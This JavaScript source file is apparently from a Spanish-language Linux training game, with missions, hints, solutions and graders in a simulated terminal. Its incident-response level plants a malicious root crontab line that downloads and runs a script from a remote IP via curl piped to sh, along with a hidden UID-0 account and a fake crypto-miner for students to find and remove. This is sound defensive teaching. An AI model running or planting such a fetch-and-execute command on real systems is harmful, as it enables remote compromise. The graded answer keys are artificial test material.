      objetivo: "Muestra solo las últimas 5 líneas de /var/log/auth.log (necesitas permisos de administrador).", pistas: ["tail muestra el final; -n 5 son 5 líneas.", "auth.log solo lo lee root: antepone sudo."],
      solucion: ["sudo tail -n 5 /var/log/auth.log"], check: (sh) => /tail/.test(ult(sh).cmd) && ult(sh).out.trim().split("\n").length === 5 },
    { id: "b3", nivel: "3 · Leer y buscar", titulo: "Intentos fallidos", setup: auth, historia: "Sospechas de un ataque de fuerza bruta por SSH.",
      objetivo: "Muestra solo las líneas de /var/log/auth.log con 'Failed password'.", pistas: ["grep busca texto en archivos.", "Recuerda sudo y las comillas: sudo grep \"Failed password\" /var/log/auth.log"],
      solucion: ['sudo grep "Failed password" /var/log/auth.log'], check: (sh) => /grep/.test(ult(sh).cmd) && ult(sh).out.split("\n").filter(Boolean).every((l) => l.includes("Failed password")) && ult(sh).out.split("\n").filter(Boolean).length === sh.vars.fallos },
    { id: "b4", nivel: "3 · Leer y buscar", titulo: "¿Cuántos fueron?", setup: auth, historia: "Tu jefe quiere el número, no la lista.",
      objetivo: "Cuenta cuántas líneas tienen 'Failed password' en /var/log/auth.log.", pistas: ["grep -c cuenta coincidencias.", "También sirve: grep ... | wc -l"],
      solucion: ['sudo grep -c "Failed password" /var/log/auth.log'], check: (sh) => ult(sh).out.trim().split(/\s+/)[0] === String(sh.vars.fallos) },
    { id: "b5", nivel: "3 · Leer y buscar", titulo: "¿Dónde quedó?", historia: "Alguien guardó un archivo .pcap en algún lugar de tu home.",
      setup: (sh) => { Linux.mkdirP(sh, "/home/alumno/a/b/c"); Linux.escribir(sh, "/home/alumno/a/b/c/incidente.pcap", "x\n"); Linux.escribir(sh, "/home/alumno/a/nota.txt", "x\n"); },
      objetivo: "Encuentra todos los archivos .pcap dentro de tu home.", pistas: ["find busca por nombre: find RUTA -name 'patrón'", "Patrón con comodín entre comillas: '*.pcap'"],
      solucion: ["find ~ -name '*.pcap'"], check: (sh) => /find/.test(ult(sh).cmd) && ult(sh).out.includes("incidente.pcap") },
    // ------------------------------------------------ Nivel 4: tuberías (análisis tipo SOC)
    { id: "t1", nivel: "4 · Tuberías", titulo: "Solo las IPs", setup: auth, historia: "Necesitas saber DE DÓNDE vienen los intentos.",
      objetivo: "De las líneas con 'Failed password', muestra solo las IPs (una por línea).", pistas: ["Encadena: grep ... | otra cosa.", "En esas líneas la IP es la palabra después de 'from'. Con espacios como separador, cut -d' ' -f… o usa grep -o.",
        "Cuenta las columnas con 'invalid user' aparte: es más fácil usar awk… o grep -oE '[0-9]+(\\.[0-9]+){3}'"],
      solucion: ["sudo grep \"Failed password\" /var/log/auth.log | grep -oE '[0-9]+(\\.[0-9]+){3}'"],
      check: (sh) => { const l = ult(sh).out.trim().split("\n"); return l.length === sh.vars.fallos && l.every((x) => /^\d+(\.\d+){3}$/.test(x.trim())); } },
    { id: "t2", nivel: "4 · Tuberías", titulo: "El atacante principal", setup: auth, historia: "Hay que bloquear al que más lo intentó.",
      objetivo: "Muestra cuántos intentos fallidos hizo cada IP, ordenado de mayor a menor.", pistas: ["Saca las IPs (misión anterior), luego sort, luego uniq -c, luego sort -nr.", "uniq solo junta repetidos que estén juntos: por eso va sort antes."],
      solucion: ["sudo grep \"Failed password\" /var/log/auth.log | grep -oE '[0-9]+(\\.[0-9]+){3}' | sort | uniq -c | sort -nr"],
      check: (sh) => /uniq -c/.test(ult(sh).cmd) && new RegExp(`^\\s*\\d+\\s+${sh.vars.top.replace(/\./g, "\\.")}\\b`).test(ult(sh).out) },
    { id: "t3", nivel: "4 · Tuberías", titulo: "Usuarios del sistema", historia: "¿Quién tiene cuenta en esta máquina?",
      objetivo: "Muestra solo los nombres de usuario de /etc/passwd (la primera columna; el separador es ':').", pistas: ["cut -d: -f1 archivo"], solucion: ["cut -d: -f1 /etc/passwd"],
      check: (sh) => /^root\nalumno\nwww-data\n?/.test(ult(sh).out) },
    { id: "t4", nivel: "4 · Tuberías", titulo: "Guarda el reporte", setup: auth, historia: "El reporte tiene que quedar en un archivo para el ticket.",
      objetivo: "Guarda en reporte.txt (en tu home) las líneas con 'Accepted' de /var/log/auth.log.", pistas: ["grep ... > archivo guarda la salida.", "sudo aplica al grep; el archivo se crea en tu home, que es tuyo."],
      solucion: ['sudo grep "Accepted" /var/log/auth.log > reporte.txt'], check: (sh) => { const t = cont(sh, "/home/alumno/reporte.txt") || ""; return t.split("\n").filter(Boolean).length === sh.vars.aceptados && !/Failed/.test(t); } },
    // ------------------------------------------------ Nivel 5: permisos
    { id: "p1", nivel: "5 · Permisos", titulo: "Lee los permisos", setup: (sh) => Linux.escribir(sh, "/home/alumno/script.sh", "#!/bin/bash\necho hola\n"),
      historia: "Antes de ejecutar un script hay que ver sus permisos.", objetivo: "Lista script.sh con sus permisos (formato largo).", pistas: ["ls -l muestra permisos."],
      solucion: ["ls -l script.sh"], check: (sh) => /^-rw-r--r--/.test(ult(sh).out) },
    { id: "p2", nivel: "5 · Permisos", titulo: "Hazlo ejecutable", setup: (sh) => Linux.escribir(sh, "/home/alumno/script.sh", "#!/bin/bash\necho hola\n"),
      historia: "Tu script no corre porque no tiene permiso de ejecución.", objetivo: "Dale permiso de ejecución a script.sh para su dueño (tú).", pistas: ["chmod u+x archivo", "O en números: 744 (rwx r-- r--)."],
      solucion: ["chmod u+x script.sh"], check: (sh) => +Linux.nodo(sh, "/home/alumno/script.sh").m[0] & 1 },
    { id: "p3", nivel: "5 · Permisos", titulo: "Llave privada", setup: (sh) => Linux.escribir(sh, "/home/alumno/id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n...\n", "alumno", "644"),
      historia: "SSH se niega a usar tu llave porque otros pueden leerla.", objetivo: "Deja id_rsa con permisos 600 (solo tú lees y escribes).", pistas: ["chmod 600 archivo. 6 = r(4)+w(2)."],
      solucion: ["chmod 600 id_rsa"], check: (sh) => Linux.nodo(sh, "/home/alumno/id_rsa").m === "600" },
    { id: "p4", nivel: "5 · Permisos", titulo: "Sin permiso", historia: "Necesitas leer un archivo que solo root puede ver.",
      objetivo: "Muestra el contenido de /etc/shadow.", pistas: ["Primero inténtalo normal y lee el error.", "sudo ejecuta como administrador."], solucion: ["sudo cat /etc/shadow"],
      check: (sh) => ult(sh).out.includes("root:*") },
    // ------------------------------------------------ Nivel 6: servicios y red
    { id: "s1", nivel: "6 · Servicios y red", titulo: "Tu IP", historia: "Necesitas tu IP para la documentación.", objetivo: "Muestra las direcciones IP de tus interfaces.",
      pistas: ["El comando moderno es ip; la subopción es a (address)."], solucion: ["ip a"], check: (sh) => ult(sh).out.includes("192.168.1.50/24") },
    { id: "s2", nivel: "6 · Servicios y red", titulo: "¿Hay internet?", historia: "Un usuario dice que no tiene internet.", objetivo: "Haz 4 pings al DNS de Google (8.8.8.8).",
      pistas: ["ping -c 4 destino (en Linux ping no se detiene solo sin -c)."], solucion: ["ping -c 4 8.8.8.8"], check: (sh) => /4 received/.test(ult(sh).out) },
    { id: "s3", nivel: "6 · Servicios y red", titulo: "Puertos abiertos", historia: "Auditoría: ¿qué servicios escuchan en esta máquina?", objetivo: "Muestra los puertos TCP/UDP que están escuchando con el proceso que los usa.",
      pistas: ["ss -tulpn (t=TCP, u=UDP, l=escuchando, p=proceso, n=números)."], solucion: ["ss -tulpn"], check: (sh) => /^(ss|netstat)/.test(ult(sh).cmd) && ult(sh).out.includes(":22") },
    { id: "s4", nivel: "6 · Servicios y red", titulo: "Servidor web", historia: "Te piden levantar un servidor web de prueba.",
      objetivo: "Instala apache2 y comprueba con curl que localhost responde.", pistas: ["sudo apt install apache2", "Luego: curl localhost"],
      solucion: ["sudo apt install -y apache2", "curl localhost"], check: (sh) => ult(sh).out.includes("It works") },
    { id: "s5", nivel: "6 · Servicios y red", titulo: "Firewall", historia: "El servidor está expuesto. Solo debe aceptar SSH y web.",
      objetivo: "Permite los puertos 22 y 80 en ufw y luego actívalo.", pistas: ["sudo ufw allow 22", "sudo ufw allow 80", "sudo ufw enable"],
      solucion: ["sudo ufw allow 22", "sudo ufw allow 80", "sudo ufw enable"], check: (sh) => sh.servicios.ufw.activo && sh.ufw.some((r) => /allow 22/.test(r)) && sh.ufw.some((r) => /allow 80/.test(r)) },
    { id: "s6", nivel: "6 · Servicios y red", titulo: "Incidente: apaga SSH", setup: auth, historia: "Te están atacando por SSH y no puedes bloquear la IP todavía.",
      objetivo: "Detén el servicio ssh y evita que arranque solo al reiniciar.", pistas: ["systemctl stop servicio", "systemctl disable servicio", "Los dos con sudo."],
      solucion: ["sudo systemctl stop ssh", "sudo systemctl disable ssh"], check: (sh) => !sh.servicios.ssh.activo && !sh.servicios.ssh.habilitado },
    // ------------------------------------------------ Nivel 7: texto pro
    { id: "x1", nivel: "7 · Texto pro", titulo: "Columnas de un CSV", historia: "Inventario de equipos exportado de la CMDB.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/inventario.csv", "R1,ISR4331,10.0.0.1,Sitio-A\nSW1,2960,10.0.0.11,Sitio-A\nSW2,2960,10.0.0.12,Sitio-B\nFW1,ASA5506,10.0.0.254,Sitio-A\n"),
      objetivo: "Muestra solo el nombre y la IP de cada equipo (columnas 1 y 3; el separador es la coma).", pistas: ["awk separa en columnas; -F, cambia el separador a coma.", "awk -F, '{print $1, $3}' archivo"],
      solucion: ["awk -F, '{print $1, $3}' inventario.csv"], check: (sh) => ult(sh).out === "R1 10.0.0.1\nSW1 10.0.0.11\nSW2 10.0.0.12\nFW1 10.0.0.254\n" },
    { id: "x2", nivel: "7 · Texto pro", titulo: "¿Cuánto se descargó?", historia: "Te piden el total de bytes servidos por el web server.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/access.log", [["10.1.1.5", 200, 5120], ["10.1.1.9", 404, 310], ["10.1.1.5", 200, 20480], ["10.1.1.7", 200, 1024], ["203.0.113.4", 500, 0]]
        .map(([ip, c, b]) => `${ip} - - [13/Nov/2026:10:00:00 -0600] "GET / HTTP/1.1" ${c} ${b}`).join("\n") + "\n"),
      objetivo: "Suma la columna 10 (bytes) de access.log y muestra el total.", pistas: ["awk puede acumular: {s+=$10}", "Al final imprime con END: awk '{s+=$10} END {print s}' access.log"],
      solucion: ["awk '{s+=$10} END {print s}' access.log"], check: (sh) => ult(sh).out.trim() === "26934" },
    { id: "x3", nivel: "7 · Texto pro", titulo: "Cambiar el gateway", historia: "Cambió el direccionamiento y hay que actualizar la config.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/red.conf", "address 192.168.1.50\nnetmask 255.255.255.0\ngateway 192.168.1.1\ndns 192.168.1.1\n"),
      objetivo: "En red.conf cambia TODAS las 192.168.1.1 por 10.0.0.1, dentro del archivo.", pistas: ["sed 's/viejo/nuevo/g' reemplaza.", "-i lo guarda en el archivo. Ojo: el punto en regex significa 'cualquier carácter'; aquí no estorba."],
      solucion: ["sed -i 's/192.168.1.1$/10.0.0.1/' red.conf"], check: (sh) => cont(sh, "/home/alumno/red.conf") === "address 192.168.1.50\nnetmask 255.255.255.0\ngateway 10.0.0.1\ndns 10.0.0.1\n" },
    { id: "x4", nivel: "7 · Texto pro", titulo: "Sin comentarios", historia: "El sshd_config tiene más comentarios que configuración.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/sshd_config", "# Puerto\nPort 22\n# No dejes entrar a root\nPermitRootLogin no\n#PasswordAuthentication yes\nPasswordAuthentication no\n"),
      objetivo: "Muestra sshd_config sin las líneas que empiezan con #.", pistas: ["grep -v invierte la búsqueda.", "O con sed: sed '/^#/d' archivo (^ = inicio de línea)."],
      solucion: ["sed '/^#/d' sshd_config"], check: (sh) => ult(sh).out === "Port 22\nPermitRootLogin no\nPasswordAuthentication no\n" },
    { id: "x5", nivel: "7 · Texto pro", titulo: "Mensaje codificado", historia: "En un correo de phishing venía este texto raro.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/mensaje.txt", btoa("flag{base64_no_es_cifrado}") + "\n"),
      objetivo: "Decodifica mensaje.txt (está en Base64).", pistas: ["base64 -d archivo"], solucion: ["base64 -d mensaje.txt"], check: (sh) => ult(sh).out.includes("flag{base64_no_es_cifrado}") },
    // ------------------------------------------------ Nivel 8: automatiza
    { id: "z1", nivel: "8 · Automatiza", titulo: "Tu primer script", historia: "Vas a automatizar tareas repetitivas.",
      objetivo: "Crea hola.sh que imprima 'Hola NetLab', dale permiso de ejecución y ejecútalo con ./hola.sh", pistas: ["echo 'echo Hola NetLab' > hola.sh", "chmod +x hola.sh", "./hola.sh"],
      solucion: ["echo 'echo Hola NetLab' > hola.sh", "chmod +x hola.sh", "./hola.sh"], check: (sh) => /^\.\/hola\.sh/.test(ult(sh).cmd) && ult(sh).out.includes("Hola NetLab") },
    { id: "z2", nivel: "8 · Automatiza", titulo: "Script con argumentos", historia: "Un compañero dejó un script de respaldo que recibe la carpeta como argumento.",
      setup: (sh) => { Linux.escribir(sh, "/home/alumno/respaldo.sh", "#!/bin/bash\n# uso: ./respaldo.sh CARPETA\nmkdir -p ~/respaldos\ncp -r $1 ~/respaldos/\necho Respaldo de $1 listo\n", "alumno", "755");
        Linux.mkdirP(sh, "/home/alumno/configs"); Linux.escribir(sh, "/home/alumno/configs/r1.cfg", "hostname R1\n"); },
      objetivo: "Lee respaldo.sh y úsalo para respaldar la carpeta configs.", pistas: ["cat respaldo.sh para ver cómo se usa.", "$1 es el primer argumento: ./respaldo.sh configs"],
      solucion: ["./respaldo.sh configs"], check: (sh) => existe(sh, "/home/alumno/respaldos/configs/r1.cfg") },
    { id: "z3", nivel: "8 · Automatiza", titulo: "Varias carpetas de un golpe", historia: "Necesitas una carpeta por VLAN.",
      objetivo: "Con un for, crea las carpetas vlan10, vlan20 y vlan30.", pistas: ["for v in 10 20 30; do mkdir vlan$v; done"], solucion: ["for v in 10 20 30; do mkdir vlan$v; done"],
      check: (sh) => usado(sh, /^for /) && ["10", "20", "30"].every((v) => esDir(sh, `/home/alumno/vlan${v}`)) },
    { id: "z4", nivel: "8 · Automatiza", titulo: "Respaldo cada noche", historia: "El respaldo debe correr solo, diario a las 2:00 am.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/respaldo.sh", "#!/bin/bash\ncp -r ~/configs ~/respaldos/\n", "alumno", "755"),
      objetivo: "Programa /home/alumno/respaldo.sh con cron todos los días a las 2:00.", pistas: ["Formato: minuto hora día mes día_semana comando → 0 2 * * *", "echo '0 2 * * * /home/alumno/respaldo.sh' > micron", "crontab micron  (y comprueba con crontab -l)"],
      solucion: ["echo '0 2 * * * /home/alumno/respaldo.sh' > micron", "crontab micron"], check: (sh) => /^0 2 \* \* \* .*respaldo\.sh/m.test(sh.crontab) },
    { id: "z5", nivel: "8 · Automatiza", titulo: "Llaves SSH", historia: "Vas a entrar a los servidores sin contraseña, con llave.",
      objetivo: "Genera una llave ed25519 en ~/.ssh/id_ed25519 sin frase de paso.", pistas: ["ssh-keygen -t TIPO -f RUTA -N \"\"", "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N \"\""],
      solucion: ['ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""'], check: (sh) => Linux.nodo(sh, "/home/alumno/.ssh/id_ed25519")?.m === "600" && existe(sh, "/home/alumno/.ssh/id_ed25519.pub") },
    // ------------------------------------------------ Nivel 9: incidente (CTF)
    { id: "c1", nivel: "9 · Incidente (CTF)", titulo: "¿Quién entró?", historia: "Alerta del SIEM: login exitoso desde una IP pública.",
      setup: (sh) => { auth(sh); const u = al(["backup", "deploy", "oracle", "svc_web", "jenkins"]), ip = ipPub(); sh.vars.c1 = `${u} ${ip}`;
        const n = Linux.nodo(sh, "/var/log/auth.log"); const l = n.d.split("\n").filter(Boolean); l.splice(Math.floor(Math.random() * l.length), 0, `Nov 13 04:12:09 netlab sshd[3310]: Accepted password for ${u} from ${ip} port 51122 ssh2`); n.d = l.join("\n") + "\n"; },
      objetivo: "Encuentra el login exitoso que NO viene de la red 192.168 y guarda 'usuario ip' en ~/respuesta.txt (ej. 'juan 1.2.3.4').",
      pistas: ["sudo grep Accepted /var/log/auth.log", "grep -v '192.168' quita los de la red interna.", "Escribe la respuesta con echo 'usuario ip' > ~/respuesta.txt"],
      solucion: ["sudo grep Accepted /var/log/auth.log | grep -v 192.168", "echo 'USUARIO IP' > ~/respuesta.txt"], check: (sh) => (cont(sh, "/home/alumno/respuesta.txt") || "").trim().replace(/\s+/g, " ") === sh.vars.c1 },
    { id: "c2", nivel: "9 · Incidente (CTF)", titulo: "Archivo escondido", historia: "El atacante suele dejar sus cosas en /tmp con nombres ocultos.",
      setup: (sh) => { Linux.mkdirP(sh, "/tmp/.cache-x", "backup"); Linux.escribir(sh, "/tmp/.cache-x/.nota", "flag{los_ocultos_empiezan_con_punto}\n", "backup"); Linux.escribir(sh, "/tmp/sesion.tmp", "x\n", "root"); },
      objetivo: "Encuentra el archivo oculto que dejó en /tmp y muestra su contenido.", pistas: ["find /tmp -name '.*'", "Luego cat a la ruta que encontraste."],
      solucion: ["find /tmp -name '.*'", "cat /tmp/.cache-x/.nota"], check: (sh) => ult(sh).out.includes("flag{los_ocultos") },
    { id: "c3", nivel: "9 · Incidente (CTF)", titulo: "Persistencia en cron", historia: "El atacante dejó una tarea que descarga algo cada 5 minutos.",
      setup: (sh) => Linux.escribir(sh, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n*/5 * * * * root curl -s http://45.33.12.9/x.sh | sh\n", "root"),
      objetivo: "Borra de /etc/crontab la línea que usa curl, sin tocar las demás.", pistas: ["Míralo primero con cat /etc/crontab.", "sed -i '/curl/d' archivo borra las líneas que tengan curl.", "Es de root: sudo."],
      solucion: ["sudo sed -i '/curl/d' /etc/crontab"], check: (sh) => { const t = cont(sh, "/etc/crontab") || ""; return !t.includes("curl") && t.includes("run-parts"); } },
    { id: "c4", nivel: "9 · Incidente (CTF)", titulo: "Otro root", historia: "Sospechas que crearon un usuario con privilegios de root.",
      setup: (sh) => { const u = al(["toor", "sysadm", "r00t", "support", "svc_backup"]); sh.vars = { ...(sh.vars || {}), c4: u }; const n = Linux.nodo(sh, "/etc/passwd"); n.d += `${u}:x:0:0::/root:/bin/bash\n`; },
      objetivo: "Muestra los usuarios de /etc/passwd con UID 0 (la tercera columna).", pistas: ["awk -F: separa por dos puntos.", "awk -F: '$3==0 {print $1}' /etc/passwd"],
      solucion: ["awk -F: '$3==0 {print $1}' /etc/passwd"], check: (sh) => ult(sh).out === `root\n${sh.vars.c4}\n` },
    { id: "c5", nivel: "9 · Incidente (CTF)", titulo: "Minero de criptomonedas", historia: "El CPU está al 100% por un proceso raro.",
      setup: (sh) => { Linux.comandos.ps([], null, sh); const pid = 3000 + Math.floor(Math.random() * 6000); sh.vars = { ...(sh.vars || {}), c5: pid };
        sh.procesos.push({ pid, u: "alumno", cmd: `/tmp/${al([".x", ".cache", ".font-unix"])}/${al(["xmrig", "kdevtmpfsi", "kinsing"])} --donate-level 1` }); },
      objetivo: "Encuentra el proceso del minero y termínalo.", pistas: ["ps aux muestra todos con su PID.", "kill PID"], solucion: ["ps aux", "kill <PID del minero>"],
      check: (sh) => !sh.procesos.some((p) => p.pid === sh.vars.c5) },
  ];
  return M;
})();

// ======================================================================
// Interfaz de la sección Linux
// ======================================================================
const LX = { estrellas: {}, sh: null, mision: null, pistas: 0, rindio: false, hecha: false, histPos: 0 };
const NIVELES_LX = [...new Set(MISIONES_LINUX.map((m) => m.nivel))];

async function cargarLinux() {
  try { LX.estrellas = (await api("/api/linux")).estrellas; } catch { LX.estrellas = {}; }
  if (!LX.mision) pintarRutaLinux();
}

function nivelDesbloqueado(i) {
  return true;  // los candados ahora los pone la ruta (temas, examen y jefe)
  if (i === 0) return true;
  const prev = MISIONES_LINUX.filter((m) => m.nivel === NIVELES_LX[i - 1]);
  return prev.filter((m) => LX.estrellas[m.id]).length >= Math.ceil(prev.length / 2);
}

function pintarMisionesLinux() {
  LX.mision = null;
  const total = MISIONES_LINUX.length, hechas = MISIONES_LINUX.filter((m) => LX.estrellas[m.id]).length;
  const est = Object.values(LX.estrellas).reduce((s, x) => s + x, 0);
  $("#linuxVista").innerHTML = `
    <div class="tarjeta lx-resumen">
      <div><b>${hechas}/${total}</b> misiones · <b>${est}/${total * 3}</b> ★</div>
      <div class="acciones">
        <button id="lxRutaBtn">← Ruta</button>
        <button id="lxLibre">🖥️ Terminal libre</button>
        <button id="lxTeoria">📖 Teoría de Linux</button>
        <button id="lxExamen">📝 Examen de Linux</button>
      </div>
    </div>
    ${NIVELES_LX.map((n, i) => {
      const abierto = nivelDesbloqueado(i);
      return `<div class="tarjeta"><h3 style="margin-top:0">${abierto ? "" : "🔒 "}Nivel ${esc(n)}</h3>
        ${abierto ? "" : '<p class="sub">Completa al menos la mitad del nivel anterior para abrirlo.</p>'}
        <div class="ws-grid">${MISIONES_LINUX.filter((m) => m.nivel === n).map((m) => {
          const e = LX.estrellas[m.id] || 0;
          return `<button class="ws-esc lx-mision ${e ? "hecha" : ""}" data-lx="${m.id}" ${abierto ? "" : "disabled"}>
            <b>${esc(m.titulo)}</b><span class="sub">${esc(m.objetivo)}</span>
            <span class="lx-estrellas">${"★".repeat(e)}<span class="vacia">${"★".repeat(3 - e)}</span></span></button>`;
        }).join("")}</div></div>`;
    }).join("")}`;
  $$("[data-lx]").forEach((b) => b.addEventListener("click", () => abrirMision(b.dataset.lx)));
  $("#lxLibre").addEventListener("click", () => abrirMision(null));
  $("#lxRutaBtn").addEventListener("click", pintarRutaLinux);
  $("#lxTeoria").addEventListener("click", () => irTeoria("linux", null));
  $("#lxExamen").addEventListener("click", examenLinux);
}

function abrirMision(id) {
  const m = id ? MISIONES_LINUX.find((x) => x.id === id) : null;
  Object.assign(LX, { mision: m, pistas: 0, rindio: false, hecha: false, sh: Linux.nuevoSistema(), histPos: 0 });
  if (m?.setup) m.setup(LX.sh);
  LX.sh.hist = []; LX.sh.salidas = [];
  $("#linuxVista").innerHTML = `<div class="lx-juego">
    <div class="tarjeta lx-panel">
      <button class="chico" id="lxVolver">← Ruta</button>
      ${m ? '<button class="chico primario btn-teofondo" id="lxTeoFondo">📖 Teoría a fondo</button>' : ""}
      ${m ? `<div class="sub" style="margin-top:10px">Nivel ${esc(m.nivel)}</div><h2>${esc(m.titulo)}</h2>
        <p>${esc(m.historia)}</p><div class="lx-objetivo">🎯 ${esc(m.objetivo)}</div>
        <div id="lxTeoFondoCaja" hidden></div>
        <div class="acciones"><button id="lxPista">💡 Pista (${m.pistas.length})</button><button id="lxRendir">🏳️ Ver solución</button></div>
        <div id="lxPistas"></div>`
      : `<h2>Terminal libre</h2><p class="sub">Practica lo que quieras. Nada de lo que hagas aquí toca tu PC: es un Linux simulado.</p>
        <p class="sub">Escribe <code>help</code> para ver los comandos y <code>man comando</code> para saber qué hace cada uno.</p>`}
      <h3>¿Qué hizo ese comando?</h3>
      <div id="lxExplica" class="sub">Escribe un comando y aquí te explico cada parte.</div>
      <div class="fila-filtro"><input id="lxTutorQ" placeholder="Pregúntale al tutor (vacío = explica lo último que hice)"><button class="chico" id="lxTutor">🤖</button></div>
      <div id="lxTutorResp"></div>
    </div>
    <div class="lx-terminal" id="lxTerm" tabindex="0">
      <pre id="lxSalida"></pre>
      <div class="lx-linea"><span id="lxPrompt"></span><input id="lxIn" autocomplete="off" spellcheck="false" autocapitalize="off"></div>
    </div></div>`;
  $("#lxVolver").addEventListener("click", () => { LX.mision = null; cargarLinux(); });
  $("#lxTeoFondo")?.addEventListener("click", (ev) => teoriaAFondo(ev.target, $("#lxTeoFondoCaja"), {
    clave: `lx:${m.id}`, mundo: "linux", titulo: m.titulo, contexto: `Nivel ${m.nivel}. ${m.historia} Objetivo: ${m.objetivo}` }));
  $("#lxPista")?.addEventListener("click", () => {
    if (LX.pistas >= m.pistas.length) return;
    LX.pistas++;
    $("#lxPistas").innerHTML = m.pistas.slice(0, LX.pistas).map((p, k) => `<p class="lx-pista">💡 ${k + 1}. ${esc(p)}</p>`).join("");
    $("#lxPista").textContent = `💡 Pista (${m.pistas.length - LX.pistas})`;
  });
  $("#lxRendir")?.addEventListener("click", () => {
    LX.rindio = true;
    $("#lxPistas").innerHTML = `<div class="lx-pista"><b>Solución</b> (escríbela tú para terminar la misión):
      ${m.solucion.map((c) => `<pre class="lx-sol">${esc(c)}</pre>${explicarComando(c)}`).join("")}</div>`;
  });
  $("#lxTutor").addEventListener("click", () => tutorLinux());
  $("#lxTutorQ").addEventListener("keydown", (e) => { if (e.key === "Enter") tutorLinux(); });
  const term = $("#lxTerm"), inp = $("#lxIn");
  term.addEventListener("click", () => inp.focus());
  inp.addEventListener("keydown", teclaLinux);
  escribirTerm(m ? `Misión: ${m.objetivo}\n\n` : "Bienvenido a la terminal de NetLab (Ubuntu 24.04 simulado).\n\n");
  actualizarPrompt();
  inp.focus();
}

function escribirTerm(t, clase) {
  const pre = $("#lxSalida");
  if (t.includes("\x0c")) { pre.innerHTML = ""; t = t.replace(/\x0c/g, ""); }
  pre.insertAdjacentHTML("beforeend", clase ? `<span class="${clase}">${esc(t)}</span>` : esc(t));
  $("#lxTerm").scrollTop = $("#lxTerm").scrollHeight;
}
const actualizarPrompt = () => { $("#lxPrompt").textContent = Linux.prompt(LX.sh); };

function teclaLinux(e) {
  const inp = e.target, h = LX.sh.hist;
  if (e.key === "Enter") {
    const linea = inp.value;
    escribirTerm(Linux.prompt(LX.sh), "lx-p"); escribirTerm(linea + "\n");
    inp.value = "";
    const r = Linux.ejecutar(LX.sh, linea);
    if (r.todo) escribirTerm(r.todo, r.code ? "lx-err" : "");
    LX.histPos = LX.sh.hist.length;
    actualizarPrompt();
    if (linea.trim() && $("#lxExplica")) $("#lxExplica").innerHTML = explicarComando(linea);
    revisarMision();
  } else if (e.key === "ArrowUp") { e.preventDefault(); if (LX.histPos > 0) inp.value = h[--LX.histPos] || ""; }
  else if (e.key === "ArrowDown") { e.preventDefault(); if (LX.histPos < h.length) inp.value = h[++LX.histPos] || ""; }
  else if (e.key === "Tab") { e.preventDefault(); const c = Linux.completar(LX.sh, inp.value); inp.value = c.linea;
    if (c.opciones) { escribirTerm(Linux.prompt(LX.sh) + c.linea + "\n", "lx-p"); escribirTerm(c.opciones.join("  ") + "\n"); } }
  else if (e.key === "l" && e.ctrlKey) { e.preventDefault(); $("#lxSalida").innerHTML = ""; }
  else if (e.key === "c" && e.ctrlKey && !window.getSelection().toString()) { e.preventDefault(); escribirTerm(Linux.prompt(LX.sh) + inp.value + "^C\n", "lx-p"); inp.value = ""; }
}

function explicarComando(linea) {
  const partes = linea.split(/\s*(?:\||&&|;|\|\|)\s*/).filter(Boolean);
  return `<ul class="lx-exp">${partes.map((p) => {
    let w = p.trim().split(/\s+/); if (w[0] === "sudo") w = w.slice(1);
    const c = w[0], ayuda = Linux.AYUDA[c];
    const ops = w.slice(1).filter((x) => /^-/.test(x)).join(" ");
    return `<li><code>${esc(p.trim())}</code>${ayuda ? ` — ${esc(ayuda)}` : ""}${p.trim().startsWith("sudo") ? " <i>(con sudo: como administrador)</i>" : ""}${ops ? ` <span class="sub">Opciones usadas: ${esc(ops)}</span>` : ""}</li>`;
  }).join("")}${/>>/.test(linea) ? "<li><code>&gt;&gt;</code> — agrega la salida al final del archivo.</li>" : />/.test(linea) ? "<li><code>&gt;</code> — guarda la salida en un archivo (lo sobrescribe).</li>" : ""}
  ${/\|/.test(linea.replace(/\|\|/g, "")) ? "<li><code>|</code> — tubería: la salida de un comando entra al siguiente.</li>" : ""}</ul>`;
}

async function revisarMision() {
  const m = LX.mision;
  if (!m || LX.hecha) return;
  let cumplida = false;
  try { cumplida = !!m.check(LX.sh); } catch { cumplida = false; }
  if (!cumplida) return;
  LX.hecha = true;
  const estrellas = LX.rindio ? 1 : LX.pistas ? 2 : 3;
  if (LX.rindio && typeof agregarRepaso === "function")
    agregarRepaso("Linux", "flash", { enunciado: `${m.objetivo}`, respuestas: m.solucion, explicacion: m.pistas.join(" "), origen: `Misión: ${m.titulo}` }, "lx:" + m.id);
  let mejora = null;
  try { mejora = await api("/api/linux/resultado", { mision: m.id, estrellas }); LX.estrellas[m.id] = mejora.ahora; } catch {}
  const idx = MISIONES_LINUX.indexOf(m), sig = MISIONES_LINUX[idx + 1];
  escribirTerm(`\n✔ ¡Misión cumplida! ${"★".repeat(estrellas)}${"☆".repeat(3 - estrellas)}\n`, "lx-ok");
  $("#lxPistas").insertAdjacentHTML("beforeend", `<div class="lx-victoria">
    <div class="lx-estrellas grande">${"★".repeat(estrellas)}<span class="vacia">${"★".repeat(3 - estrellas)}</span></div>
    <b>¡Misión cumplida!</b>${estrellas < 3 ? `<div class="sub">${LX.rindio ? "Viste la solución" : "Usaste pistas"}: repítela sin ayuda para las 3 estrellas.</div>` : ""}
    <div class="acciones">${sig ? `<button class="primario" id="lxSig">Siguiente: ${esc(sig.titulo)} →</button>` : ""}<button id="lxMapa">Mapa</button></div></div>`);
  $("#lxSig")?.addEventListener("click", () => abrirMision(sig.id));
  $("#lxMapa").addEventListener("click", () => { LX.mision = null; cargarLinux(); });
  if (typeof refrescarJugador === "function") refrescarJugador(true);
}

async function tutorLinux() {
  const ult = LX.sh.salidas.slice(-3).map((s) => `$ ${s.cmd}\n${(s.err + s.out).slice(0, 600)}`).join("\n");
  const caja = $("#lxTutorResp");
  const pregunta = $("#lxTutorQ").value.trim();
  $("#lxTutorQ").value = "";
  try {
    const r = await trabajo("/api/tutor", { area: "Linux", contexto: (LX.mision ? `Misión: ${LX.mision.objetivo}\n` : "") + `Últimos comandos en la terminal:\n${ult || "(ninguno)"}`,
